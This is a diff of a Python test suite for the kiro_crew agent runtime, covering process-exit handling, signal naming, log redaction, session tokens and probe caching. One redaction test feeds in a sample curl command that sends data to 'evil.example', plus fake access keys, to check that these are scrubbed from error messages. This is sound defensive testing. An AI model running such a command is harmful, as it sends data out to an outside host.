@@ -24,7 +24,9 @@ lines; the subprocess and stdin are mocked (no kiro-cli is launched).
 import asyncio
 import gc
 import json
+import logging
 import os
+import signal
 import time
 import weakref
 from pathlib import Path
@@ -68,11 +70,32 @@ from kiro_crew.acp.types import (
     METHOD_SET_MODE,
     JsonRpcMessage,
 )
+from kiro_crew.kiro_cli import SPEC_PERMISSIONS_MIN_VERSION
 from kiro_crew.mcp_cleanup import KIROCREW_BIN_MCP_SERVERS
 from kiro_crew.mcp_gateway.claim import STUB_SESSION_TOKEN_ENV
 from kiro_crew.metrics.events import CHILD_PERMISSION_DENIED
 
 # ── Harness ──
+
+
+@pytest.fixture(autouse=True)
+def _pinned_kiro_cli_version(monkeypatch):
+    """Pin the kiro-cli release the spec ``permissions`` gate believes is installed.
+
+    A runtime start materialises the agent spec (``ensure_agent_materialized`` ->
+    ``rebuild_agent_config``) and a worker install writes one
+    (``_install_worker_agent`` -> ``_write_worker_spec``); both end in
+    ``_write_derived_permissions``, which reads ``installed_kiro_cli_version``
+    function-locally from ``kiro_crew.kiro_cli``: one real ``kiro-cli --version``
+    spawn per binary identity, process-cached, so whichever test in the worker
+    writes a spec first pays it against the HOST's install with the checkout as
+    the child's cwd. Pinned to the floor release, as ``test_agent.py`` and the
+    generated-writer suites pin it.
+    """
+    monkeypatch.setattr(
+        "kiro_crew.kiro_cli.installed_kiro_cli_version",
+        lambda: SPEC_PERMISSIONS_MIN_VERSION,
+    )
 
 
 @pytest.fixture
@@ -224,11 +247,31 @@ def kas_readiness_wire(monkeypatch, tmp_path):
                 assert name in wire_names
                 element = next(e for e in request["params"]["mcpServers"] if e["name"] == name)
                 assert element["type"] == "stdio"
-                assert element["command"] == projected["mcpServers"][name]["command"]
-                assert element["env"] == [
+                # The resume path owns its array, so its session token rides on
+                # the hoisted element; create_session is handed an explicit array
+                # here, which mints none.
+                tokens = [pair for pair in element["env"] if pair["name"] == STUB_SESSION_TOKEN_ENV]
+                assert len(tokens) == (1 if resume else 0) and all(p["value"] for p in tokens)
+                declared_env = [
                     {"name": k, "value": str(v)}
                     for k, v in (projected["mcpServers"][name].get("env") or {}).items()
                 ]
+                if not tokens:
+                    assert element["command"] == projected["mcpServers"][name]["command"]
+                    assert element["env"] == declared_env
+                    continue
+                # A tokened element launches the managed invocation, never the
+                # spec's (KAS spawns it; gatewayd's own-binary check never runs).
+                from kiro_crew.agent import _managed_mcp_env, managed_mcp_spec_entry
+
+                managed = managed_mcp_spec_entry(name, include_opt_in=True)
+                assert element["command"] == managed["command"]
+                assert element["args"] == [str(a) for a in managed.get("args", [])]
+                assert [p for p in element["env"] if p not in tokens] == [
+                    p
+                    for p in declared_env
+                    if p["name"] in ("KIROCREW_PORT", "KIROCREW_SESSION_KEY")
+                ] + [{"name": k, "value": v} for k, v in _managed_mcp_env().items()]
         if pre_ready:
             status("connected")
             tags("kirocrew-core", "kirocrew-dashboard")
@@ -2046,6 +2089,118 @@ async def test_mark_dead_is_idempotent():
     assert q["sA"].empty()
 
 
+# ── An exit the reader OBSERVES retires the registry entries too ─────────────
+#
+# ``_kill_inner`` untracks the root after its own reap. A root killed from outside
+# reached no kill, so its ``kiro_session_pids.txt`` / ``kiro_pids.txt`` lines
+# survived until the periodic sweep's next tick, up to 300s. Measured on the
+# nightly leak gate: SIGKILL of a background runtime left its line for 293s. The
+# reader loop's EOF branch now retires the two entries once the exit is CONFIRMED,
+# and only then -- a closed stdout on a process that is still running, or one
+# whose exit cannot be confirmed within the reap window, keeps its lines.
+
+
+def _track_untracks(monkeypatch, rt_mod, *, pid_exists: bool):
+    """Record every identity-bound retirement; the real one is pinned in
+    test_pid_lifecycle.py against the files themselves."""
+    calls: list[tuple[int, str | None]] = []
+    monkeypatch.setattr(
+        rt_mod, "_untrack_root_by_identity", lambda p, tok: calls.append((p, tok)) or True
+    )
+    monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda p: pid_exists)
+    return calls
+
+
+@pytest.mark.asyncio
+async def test_observed_exit_retires_registry_entries_once_reaped(monkeypatch):
+    """EOF on a root that the child watcher then reaps: both entries are dropped."""
+    import kiro_crew.acp.runtime as rt_mod
+
+    rt, reader, proc = _make_runtime()
+    rt._spawn_start_token = "tok-4242"
+    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
+
+    async def _reap():  # the reap lands after EOF, as in the field
+        proc.returncode = -9
+        return -9
+
+    proc.wait = _reap
+    task = await _start_reader(rt)
+    try:
+        reader.feed_eof()
+        await asyncio.wait_for(task, timeout=2.0)
+    finally:
+        await _stop_reader(task)
+    assert rt._dead is True
+    # Bound to the identity read at spawn, never to the bare number.
+    assert calls == [(4242, "tok-4242")]
+    # The status the wait measured reaches the retained summary: a turn or a
+    # cron that records this death sees the real code, not ``<not reaped>``.
+    assert rt._death_label == "-9"
+    assert rt._death_summary is not None and "returncode=-9" in rt._death_summary
+
+
+@pytest.mark.asyncio
+async def test_observed_exit_keeps_tracking_while_the_root_still_runs(monkeypatch):
+    """A closed stdout is not an exit. A root that never exits within the reap
+    window, or one whose pid still answers after the wait, stays tracked -- an
+    untracked live process is invisible to every reaper for the host's uptime."""
+    import kiro_crew.acp.runtime as rt_mod
+
+    # Wait times out: the process closed its pipe and kept running.
+    rt, reader, proc = _make_runtime()
+    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
+    rt._KILL_REAP_TIMEOUT = 0.05
+
+    async def _never_exits():
+        await asyncio.sleep(10)
+
+    proc.wait = _never_exits
+    task = await _start_reader(rt)
+    try:
+        reader.feed_eof()
+        await asyncio.wait_for(task, timeout=2.0)
+    finally:
+        await _stop_reader(task)
+    assert calls == []
+
+    # Reaped by the watcher's account, yet the pid still answers: retain.
+    rt, reader, proc = _make_runtime()
+    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=True)
+    proc.returncode = 1
+    task = await _start_reader(rt)
+    try:
+        reader.feed_eof()
+        await asyncio.wait_for(task, timeout=2.0)
+    finally:
+        await _stop_reader(task)
+    assert calls == []
+
+
+@pytest.mark.asyncio
+async def test_eof_inside_an_oversize_line_retires_the_same_way(monkeypatch):
+    """The other observed-EOF return: stdout closes mid-oversize-line. Same
+    confirmed exit, same retirement -- a sibling left to the sweep would carry
+    the very 300s window the empty-line branch closes."""
+    import kiro_crew.acp.runtime as rt_mod
+
+    rt, reader, proc = _make_runtime()
+    rt._spawn_start_token = "tok-4242"
+    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
+    proc.returncode = 137
+    task = await _start_reader(rt)
+    try:
+        # Over the reader's line limit with no newline, then EOF: readuntil raises
+        # LimitOverrunError, the drain hits IncompleteReadError.
+        reader.feed_data(b"x" * (reader._limit + 1))
+        reader.feed_eof()
+        await asyncio.wait_for(task, timeout=2.0)
+    finally:
+        await _stop_reader(task)
+    assert rt._dead is True
+    assert calls == [(4242, "tok-4242")]
+
+
 # ── Death-log severity: deliberate teardown vs genuine death ──
 #
 # A warm-pool TTL recycle tears runtimes down via kill() on a schedule; logging
@@ -2553,7 +2708,15 @@ async def test_reader_crash_on_a_running_child_does_not_print_returncode_none(ca
 
 
 @pytest.mark.asyncio
-async def test_exit_reason_appends_last_nonempty_stderr_line():
+async def test_exit_reason_does_not_promote_the_last_stderr_line_to_a_cause():
+    """A child's last word is not why it died.
+
+    ``Error: failed to create sandbox dir`` describes no death -- it is whatever
+    the child happened to flush last -- so the reason stays the exit status and
+    the line is kept at debug. Pasting such a line as the cause is what puts
+    ``HTTP 404 Not Found`` on the card of a death that was in fact an ordinary
+    SIGTERM teardown.
+    """
     rt, reader, proc = _make_runtime()
     proc.returncode = 1
     rt._stderr_lines = ["warming up", "Error: failed to create sandbox dir", "   "]
@@ -2567,9 +2730,27 @@ async def test_exit_reason_appends_last_nonempty_stderr_line():
     finally:
         await _stop_reader(task)
     msg = str(ei.value)
-    assert msg.startswith("process exited (rc=1): Error: failed to create sandbox dir")
+    assert msg == "process exited (rc=1)"
+    assert "sandbox dir" not in msg
     assert "warming up" not in msg
     assert "kirocrew doctor" not in msg
+
+
+def test_exit_reason_names_the_signal_that_ended_the_child():
+    """A negative returncode is POSIX's ``-signum``, and the number alone is the
+    part an operator has to look up -- while ``signal SIGTERM`` says plainly that
+    something ASKED the process to stop, which is what the fleet's deaths were."""
+    rt, _reader, _proc = _make_runtime()
+    assert rt._exit_reason(-15) == "process exited (rc=-15 (signal SIGTERM))"
+    # SIGKILL is POSIX only; see the same reasoning in
+    # test_runtime_death_is_a_process_event.py::test_signal_death_names_its_signal.
+    # Windows cannot name signal 9 and its negative returncodes are not signums,
+    # so the number alone is correct there rather than a name it never delivered.
+    if hasattr(signal, "SIGKILL"):
+        assert rt._exit_reason(-9) == "process exited (rc=-9 (signal SIGKILL))"
+    else:
+        assert rt._exit_reason(-9) == "process exited (rc=-9)"
+    assert rt._exit_reason(1) == "process exited (rc=1)"
 
 
 def test_exit_reason_without_stderr_is_unchanged():
@@ -2590,42 +2771,71 @@ def test_exit_reason_enospc_points_at_doctor():
     assert "kirocrew doctor" in rt._exit_reason(1)
 
 
-def test_exit_reason_redacts_credentials_and_exfil_urls_in_the_tail():
+def test_exit_reason_finds_a_signature_that_is_not_the_last_line():
+    """Which line a child flushed last is a race with its own buffering, so the
+    signature is searched over the whole retained tail."""
+    rt, _reader, _proc = _make_runtime()
+    rt._stderr_lines = [
+        "mkdir: cannot create directory: No space left on device",
+        "shutting down",
+    ]
+    assert "kirocrew doctor" in rt._exit_reason(1)
+
+
+def test_exit_reason_redacts_credentials_and_exfil_urls_in_a_proven_cause():
+    """Redaction is unconditional and lands BEFORE the cut, so a long line
+    cannot leave a secret's first half in the shown prefix. Asserted on a line
+    that DOES earn the cause slot, since that is the text the card carries."""
     import kiro_crew.acp.runtime as rt_mod
 
     rt, _reader, _proc = _make_runtime()
     payload = "A" * 80
     rt._stderr_lines = [
-        f"auth failed: curl https://evil.example/collect?data={payload} "
+        f"No space left on device: curl https://evil.example/collect?data={payload} "
         "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
     ]
     msg = rt._exit_reason(1)
     assert "AKIAIOSFODNN7EXAMPLE" not in msg
     assert payload not in msg
-    assert "auth failed" in msg
-    # The cut lands AFTER redaction, so a long line cannot leave a secret's
-    # first half in the shown prefix.
-    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"]
+    assert "No space left on device" in msg
+    rt._stderr_lines = [
+        "No space left on device "
+        + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4)
+        + " AKIAIOSFODNN7EXAMPLE"
+    ]
     assert "AKIAIOSFODNN7" not in rt._exit_reason(1)
 
 
-def test_exit_reason_tail_is_bounded_to_one_line():
+def test_exit_reason_redacts_the_demoted_tail_too(caplog):
+    """The debug log is a real sink, so the line demoted to it is redacted on
+    the same pass -- a secret must not survive by being merely unpromoted."""
+    rt, _reader, _proc = _make_runtime()
+    with caplog.at_level(logging.DEBUG, logger="kiro_crew.acp.runtime"):
+        rt._stderr_lines = ["boom Authorization: Bearer AKIAIOSFODNN7EXAMPLE"]
+        rt._exit_reason(1)
+    assert "exit stderr tail" in caplog.text
+    assert "AKIAIOSFODNN7EXAMPLE" not in caplog.text
+
+
+def test_exit_reason_cause_is_bounded_to_one_line():
     from kiro_crew.acp import runtime as rt_mod
 
     assert rt_mod._STDERR_REASON_TAIL_CHARS == 200
     rt, _reader, _proc = _make_runtime()
-    rt._stderr_lines = ["x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
+    lead = "No space left on device "
+    rt._stderr_lines = [lead + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
     msg = rt._exit_reason(1)
-    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + 64
-    assert msg.endswith("…")
+    assert "…" in msg
+    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + len(rt_mod._ENOSPC_HINT) + 80
     # Exactly at the cap nothing is cut.
-    rt._stderr_lines = ["y" * rt_mod._STDERR_REASON_TAIL_CHARS]
-    assert not rt._exit_reason(1).endswith("…")
+    rt._stderr_lines = [lead.ljust(rt_mod._STDERR_REASON_TAIL_CHARS, "y")]
+    assert "…" not in rt._exit_reason(1)
 
 
 def test_exit_reason_enospc_hint_survives_the_tail_cap():
-    """The signature is matched on the whole line: a marker past the cap
-    still points at the doctor even though the card shows only the head."""
+    """The signature is matched on the whole line and the HINT is appended after
+    the cut, so a line long enough to be trimmed cannot push the operator's
+    pointer out of the message that pointer is the whole purpose of."""
     from kiro_crew.acp import runtime as rt_mod
 
     rt, _reader, _proc = _make_runtime()
@@ -3268,11 +3478,19 @@ async def test_handle_wait_turn_done_timeout():
     assert result is False
 
 
+def _recorded_request(request_id):
+    """The event the handle builds for a permission request it routes."""
+    from kiro_crew.acp.types import EVENT_PERMISSION_REQUEST, AcpEvent
+
+    return AcpEvent(kind=EVENT_PERMISSION_REQUEST, request_id=request_id, title="notes.txt")
+
+
 @pytest.mark.asyncio
 async def test_handle_approve_tool():
     rt, _, proc = _make_runtime()
     q = _register(rt, "sA")
     handle = AcpSessionHandle("sA", q["sA"], rt)
+    handle._permission_gate_events["req-7"] = _recorded_request("req-7")
     await handle.approve_tool("req-7", option_id="allow_always")
     sent = json.loads(proc.stdin.write.call_args.args[0].decode())
     assert sent["id"] == "req-7"
@@ -3706,6 +3924,7 @@ async def test_approve_tool_echoes_recorded_option():
     handle = AcpSessionHandle("sA", q["sA"], rt)
     # Simulate build_permission_event having recorded claude-agent-acp ids.
     handle._permission_options[42] = {"once": "allow", "always": "allow_always"}
+    handle._permission_gate_events[42] = _recorded_request(42)
     await handle.approve_tool(42)  # no explicit id → resolves the "once" variant
     sent = json.loads(proc.stdin.write.call_args.args[0].decode())
     assert sent["result"]["outcome"]["optionId"] == "allow"
@@ -5743,6 +5962,71 @@ class TestAcpRuntimePidTracking:
         assert calls["session"] == [4242]
 
     @pytest.mark.asyncio
+    async def test_kill_retires_by_identity_when_a_spawn_token_is_held(self, monkeypatch):
+        """The reap proved THIS process dead, not that its number is still ours:
+        a root spawned since can already hold it. So the kill path retires the
+        line that names this process (the token read at spawn), never the lines
+        that merely carry the number."""
+        rt, _, proc = _make_runtime()
+        proc.wait = AsyncMock(return_value=0)
+        rt._spawn_start_token = "tok-a"
+
+        import kiro_crew.acp.runtime as rt_mod
+
+        if rt_mod.platform_compat.IS_WINDOWS:
+            pytest.skip("the Windows owned drain retires under its pin; covered separately")
+        identity_calls: list[tuple[int, str]] = []
+
+        def _by_identity(pid, token):
+            identity_calls.append((pid, token))
+            return True
+
+        def _never(*_a):
+            raise AssertionError("prefix-matched untrack ran although a token was held")
+
+        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", _by_identity)
+        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", _never)
+        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
+        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)
+
+        await rt.kill()
+
+        assert identity_calls == [(4242, "tok-a")]
+
+    @pytest.mark.asyncio
+    async def test_kill_clears_the_bare_line_only_while_dead_when_no_session_line_was_ours(
+        self, monkeypatch
+    ):
+        """Identity retirement found no line of ours (spawn's append failed, or a
+        successor already replaced it). The bare line still goes -- but through
+        the probe-under-lock helper, never by number alone."""
+        rt, _, proc = _make_runtime()
+        proc.wait = AsyncMock(return_value=0)
+        rt._spawn_start_token = "tok-a"
+
+        import kiro_crew.acp.runtime as rt_mod
+
+        if rt_mod.platform_compat.IS_WINDOWS:
+            pytest.skip("the Windows owned drain retires under its pin; covered separately")
+        if_dead_calls: list[int] = []
+
+        def _never(*_a):
+            raise AssertionError("prefix-matched untrack ran although a token was held")
+
+        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", lambda pid, token: False)
+        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", lambda pid: if_dead_calls.append(pid))
+        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
+        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
+        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
+        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)
+
+        await rt.kill()
+
+        assert if_dead_calls == [4242]
+
+    @pytest.mark.asyncio
     async def test_kill_keeps_pid_tracked_when_the_process_survives(self, monkeypatch):
         """A survivor must STAY tracked so the orphan sweeps can still reach it.
 
@@ -6237,7 +6521,7 @@ class TestAcpRuntimeLoadSession:
 
             return SessionExtras(custom_agents=[{"id": agent, "prompt": "p", "tools": []}])
 
-        def _hoist(agents, agent, servers):
+        def _hoist(agents, agent, servers, **_kw):
             # The shape the real hoist produces: a managed server appears on the
             # array that was not in the roster the caller passed in.
             return agents, list(servers) + [{"name": "hoisted", "command": "/bin/h"}]
@@ -6265,6 +6549,77 @@ class TestAcpRuntimeLoadSession:
             "the report reads a different array than the resume sent; rebind "
             "wire_servers at the hoist rather than only load_params['mcpServers']"
         )
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
+    async def test_kas_hoisted_control_plane_carries_the_session_token(self, monkeypatch, resume):
+        """On KAS the managed servers reach the wire through the hoist, token included.
+
+        The runtime stamps the per-session token onto its array BEFORE
+        ``hoist_managed_servers`` runs, and on KAS that array is empty: every
+        managed server arrives through the hoist. A hoisted ``kirocrew-core``
+        without the token reads its tool policy unattested and refuses every call
+        as ``identity_unattested`` -- memory, logs, spawn_run -- on every session.
+        """
+        rt, _, _ = _make_runtime()
+        rt._can_load_session = True
+        sent: list[tuple[str, dict]] = []
+
+        async def _fake_send(method, params, timeout=None):
+            sent.append((method, params))
+            if method == METHOD_SESSION_LOAD:
+                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
+            if method == METHOD_SESSION_NEW:
+                return {"sessionId": "sid-kas-new"}
+            return {}
+
+        async def _fake_agents(agent, *, member_dispatch=False, crew_panel=False, session_key=""):
+            from kiro_crew.acp.harness import SessionExtras
+
+            return SessionExtras(
+                custom_agents=[
+                    {
+                        "id": agent,
+                        "prompt": "p",
+                        "tools": ["@kirocrew-core", "@external"],
+                        "mcpServers": {
+                            "kirocrew-core": {
+                                "command": "kc",
+                                "args": ["mcp-core"],
+                                "env": {"KIROCREW_SESSION_KEY": session_key},
+                            },
+                            "external": {"command": "ext"},
+                        },
+                    }
+                ]
+            )
+
+        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
+        monkeypatch.setattr(rt, "_kas_custom_agents", _fake_agents)
+        # Readiness is its own concern (see the kas_readiness_wire tests); this one
+        # is about what the request carried, so the wait returns at once.
+        monkeypatch.setattr(AcpSessionHandle, "wait_mcp_ready", AsyncMock(return_value=None))
+        rt._acp_backend = ACP_BACKEND_KAS
+
+        if resume:
+            handle = await rt.load_session(
+                "", "sid-kas-load", cwd="/work", agent="kirocrew", session_key="dashboard:chat-1"
+            )
+            method = METHOD_SESSION_LOAD
+        else:
+            handle = await rt.create_session(
+                cwd="/work", agent="kirocrew", session_key="dashboard:chat-1"
+            )
+            method = METHOD_SESSION_NEW
+        params = next(p for m, p in sent if m == method)
+        core = [e for e in params["mcpServers"] if e.get("name") == "kirocrew-core"]
+        assert len(core) == 1, "kirocrew-core must travel in the session-level array"
+        (token,) = _identity_tokens(core)
+        assert token, "the hoisted kirocrew-core was launched without the session token"
+        assert token == handle.stub_session_token, "the element must carry THIS session's token"
+        # A third-party server stays in the agent block, and never gets the token.
+        (agent_block,) = params["_meta"]["kiro"]["customAgents"]
+        assert STUB_SESSION_TOKEN_ENV not in json.dumps(agent_block)
 
     @pytest.mark.asyncio
     async def test_load_session_keeps_the_transcript_path_alongside_the_agents(self, monkeypatch):
@@ -8563,7 +8918,8 @@ async def test_unknown_session_drops_aggregate_into_one_counted_record(caplog):
         records = _drop_records(caplog)
         assert len(records) == 1, records
         assert (
-            "Dropped 6 unroutable frame(s) for session ghost (method=session/update)" in records[0]
+            "Dropped 6 unroutable frame(s) for session 'ghost' (method='session/update')"
+            in records[0]
         )
         # The point of the change: SIX dropped frames produce ONE log record,
         # not six. Counts every record naming the session, whatever its wording.
@@ -8592,8 +8948,8 @@ async def test_two_unknown_sessions_are_counted_separately(caplog):
         records = _drop_records(caplog)
         assert len(records) == 2, records
         joined = "\n".join(records)
-        assert "Dropped 3 unroutable frame(s) for session sid-aaa" in joined
-        assert "Dropped 2 unroutable frame(s) for session sid-bbb" in joined
+        assert "Dropped 3 unroutable frame(s) for session 'sid-aaa'" in joined
+        assert "Dropped 2 unroutable frame(s) for session 'sid-bbb'" in joined
     finally:
         await _stop_reader(task)
 
@@ -8634,7 +8990,7 @@ async def test_no_session_broadcast_drops_are_counted(caplog):
         records = _drop_records(caplog)
         assert len(records) == 1, records
         assert "Dropped 4 unroutable frame(s)" in records[0]
-        assert "(method=mcp/status)" in records[0]
+        assert "(method='mcp/status')" in records[0]
     finally:
         await _stop_reader(task)
 
@@ -8657,9 +9013,9 @@ def test_drop_counter_state_does_not_leak_between_intervals(caplog):
 
     records = _drop_records(caplog)
     assert len(records) == 2, records
-    assert "Dropped 2 unroutable frame(s) for session sid-x" in records[0]
+    assert "Dropped 2 unroutable frame(s) for session 'sid-x'" in records[0]
     # Not 3 — the first window's count did not carry over.
-    assert "Dropped 1 unroutable frame(s) for session sid-x" in records[1]
+    assert "Dropped 1 unroutable frame(s) for session 'sid-x'" in records[1]
 
 
 def test_drop_counter_map_is_bounded(caplog):
@@ -8693,6 +9049,52 @@ def test_drop_counter_truncates_backend_controlled_key_text():
     assert count == 1
     assert len(session_id) == limit
     assert len(method) == limit
+
+
+def test_drop_key_is_redacted_before_the_retention_cap(caplog):
+    """A credential straddling the 80-char cut leaves no fragment in key or log.
+
+    Redact-before-bound on the retained key: a slice taken FIRST would sever the
+    token at the cap into a head no credential pattern matches, and the flush
+    would then log that head verbatim.
+    """
+    import logging
+
+    import kiro_crew.acp.runtime as runtime_mod
+
+    rt, _reader, _ = _make_runtime()
+    limit = runtime_mod._DROP_SUMMARY_KEY_MAX_CHARS
+    token = "AKIA" + "STRADDLE0123456A"
+    hostile = "s" * (limit - 9) + token + " tail"
+    assert limit - 9 < limit < limit - 9 + len(token), "premise: the cap cuts the token"
+
+    rt._note_dropped_frame(hostile, hostile)
+    (session_id, method), count = next(iter(rt._dropped_frames.items()))
+    assert count == 1
+    for part in (session_id, method):
+        assert "AKIA" not in part and len(part) <= limit
+
+    with caplog.at_level(logging.DEBUG, logger="kiro_crew.acp.runtime"):
+        rt._flush_dropped_frames()
+    records = _drop_records(caplog)
+    assert records, "the flush must still report the drop"
+    assert all("AKIA" not in r for r in records)
+
+
+def test_drop_key_over_the_redact_input_cap_keeps_only_its_length():
+    """A multi-KB key half never reaches the redactor and retains no content."""
+    import kiro_crew.acp._dispatch as acp_dispatch
+    import kiro_crew.acp.runtime as runtime_mod
+
+    rt, _reader, _ = _make_runtime()
+    huge = "ghp_" + "A" * (acp_dispatch._REQUEST_ID_REDACT_INPUT_CAP + 40)
+
+    rt._note_dropped_frame(huge, "session/update")
+
+    (session_id, method), count = next(iter(rt._dropped_frames.items()))
+    assert count == 1 and method == "session/update"
+    assert session_id.startswith("<id too long: ") and "ghp_" not in session_id
+    assert len(session_id) <= runtime_mod._DROP_SUMMARY_KEY_MAX_CHARS
 
 
 def test_drop_counter_handles_missing_method():
@@ -8769,7 +9171,7 @@ def test_drop_counter_placeholder_appears_in_flushed_summary(caplog):
 
     records = _drop_records(caplog)
     assert len(records) == 1, records
-    assert "Dropped 1 unroutable frame(s) for session ? (method=?)" in records[0]
+    assert "Dropped 1 unroutable frame(s) for session '?' (method='?')" in records[0]
 
 
 class TestToolPurposeExtraction:
@@ -9438,6 +9840,13 @@ async def _drain_audits(rt) -> None:
     """Await in-flight audit tasks so none outlives the test's event loop."""
     if rt._audit_tasks:
         await asyncio.gather(*list(rt._audit_tasks), return_exceptions=True)
+
+
+async def _drain_answers(rt) -> None:
+    """Await the retained off-loop permission answers (each writes stdin under
+    the transport's write lock, so a burst completes over several turns)."""
+    if rt._answer_tasks:
+        await asyncio.gather(*list(rt._answer_tasks), return_exceptions=True)
 
 
 @pytest.mark.asyncio
@@ -12388,6 +12797,9 @@ async def test_buffered_burst_with_responsive_backend_does_not_trip_cap():
     task = await _start_reader(rt)
     try:
         await _drain(reader)
+        # The answers are retained tasks that take the stdin write lock in
+        # turn; wait on that observable condition rather than a turn count.
+        await _drain_answers(rt)
         await _drain_audits(rt)
         # Responsive backend (writes complete immediately): every request
         # answered, cap never tripped.
@@ -12605,14 +13017,38 @@ async def test_probe_failure_returns_empty_and_closes_init_scope():
 @pytest.mark.asyncio
 async def test_probe_advertising_nothing_returns_empty_but_still_terminates():
     """A session/new that omits models yields [] — and the probe session is
-    still evicted, and the empty answer is NOT cached (the next call probes
-    again rather than repeating a non-answer)."""
+    still evicted. The empty outcome is TTL-recorded (O4), so a second call
+    inside the TTL replays [] WITHOUT opening a fresh session/new; the cached
+    RESULT stays empty (no evidence = fail open)."""
     rt, _, _ = _make_runtime()
     rt._send_and_await = AsyncMock(  # type: ignore[method-assign]
         side_effect=[{"sessionId": "probe-2"}, {}, {"sessionId": "probe-3"}, {}]
     )
     assert await rt.probe_advertised_models() == []
     assert rt._send_and_await.call_args_list[1].args[0] == METHOD_SESSION_TERMINATE
+    # Second call inside the TTL: still [], but no NEW session/new was opened.
+    assert await rt.probe_advertised_models() == []
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 1
+
+
+@pytest.mark.asyncio
+async def test_probe_failure_is_ttl_cached_so_a_burst_costs_one_session(monkeypatch):
+    """O4: a FAILING probe records the attempt time too, so a burst of reads
+    inside the TTL costs one session/new, not one per read. The failure replays
+    as [] (no evidence = fail open) and the cached result stays empty."""
+    rt, _, _ = _make_runtime()
+    rt._send_and_await = AsyncMock(  # type: ignore[method-assign]
+        side_effect=AcpRuntimeError("boom")
+    )
+    assert await rt.probe_advertised_models() == []
+    assert await rt.probe_advertised_models() == []
+    # The single-flight lock serialized both; only ONE session/new was attempted
+    # because the second call hit the TTL guard on the recorded failure time.
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 1
+    # Past the TTL, it probes again (still failing here).
+    rt._entitlement_probe_attempt_at = time.monotonic() - 100.0
     assert await rt.probe_advertised_models() == []
     news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
     assert len(news) == 2
@@ -12629,6 +13065,80 @@ async def test_probe_result_reused_within_ttl():
     assert second == first
     # One session/new + one terminate total: the second call never hit the wire.
     assert rt._send_and_await.await_count == 2
+
+
+@pytest.mark.asyncio
+async def test_a_failure_never_revives_an_expired_success(monkeypatch):
+    """P2: once a successful result's OWN TTL has expired, a subsequent FAILURE
+    within its own (attempt) TTL must return [] — not replay the stale success.
+    A failure buys a no-new-session window, never a fresh lease on old data."""
+    rt, _, _ = _make_runtime()
+    rt._send_and_await = AsyncMock(  # type: ignore[method-assign]
+        side_effect=[_PROBE_RESP, {}, AcpRuntimeError("boom")]
+    )
+    first = await rt.probe_advertised_models()
+    assert [m["modelId"] for m in first] == ["auto", "claude-opus-5"]
+    # Expire BOTH clocks so the next call is a genuinely fresh probe (not an
+    # attempt-window replay); it fails, stamping only the attempt clock.
+    rt._entitlement_probe_result_at = time.monotonic() - 100.0
+    rt._entitlement_probe_attempt_at = time.monotonic() - 100.0
+    failed = await rt.probe_advertised_models()
+    assert failed == []  # the expired success is NOT replayed
+    # A burst right after the failure returns [] from the attempt-clock window,
+    # still never the stale success, and opens no new session.
+    assert await rt.probe_advertised_models() == []
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 2  # the original success + the one failure
+
+
+@pytest.mark.asyncio
+async def test_old_success_and_repeated_failures_past_ttl_reprobe(monkeypatch):
+    """P2: an old success plus failures for longer than the TTL does not replay
+    forever — once both clocks are stale the next call opens a fresh session."""
+    rt, _, _ = _make_runtime()
+    rt._send_and_await = AsyncMock(  # type: ignore[method-assign]
+        side_effect=[_PROBE_RESP, {}, AcpRuntimeError("boom"), _PROBE_RESP, {}]
+    )
+    await rt.probe_advertised_models()  # success
+    # Expire both clocks so the next call is a fresh probe (a failure).
+    rt._entitlement_probe_result_at = time.monotonic() - 100.0
+    rt._entitlement_probe_attempt_at = time.monotonic() - 100.0
+    await rt.probe_advertised_models()  # failure, stamps attempt clock only
+    # The success result is long expired and the fresh attempt clock is now
+    # stale too: the next call must probe again, not replay the old success.
+    rt._entitlement_probe_attempt_at = time.monotonic() - 100.0
+    third = await rt.probe_advertised_models()
+    assert [m["modelId"] for m in third] == ["auto", "claude-opus-5"]
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 3
+
+
+@pytest.mark.asyncio
+async def test_force_bypasses_the_failure_replay_but_not_a_recent_success(monkeypatch):
+    """D1: a user action (force=True) skips the failed/empty attempt-clock replay
+    so it earns a fresh probe, but still honours a recent NON-EMPTY success —
+    re-probing gains nothing there. force=False keeps the burst cap."""
+    rt, _, _ = _make_runtime()
+    rt._send_and_await = AsyncMock(  # type: ignore[method-assign]
+        side_effect=[AcpRuntimeError("boom"), _PROBE_RESP, {}]
+    )
+    # First attempt fails, stamping the attempt clock.
+    assert await rt.probe_advertised_models() == []
+    # force=False within the TTL replays [] with no new session (the read path).
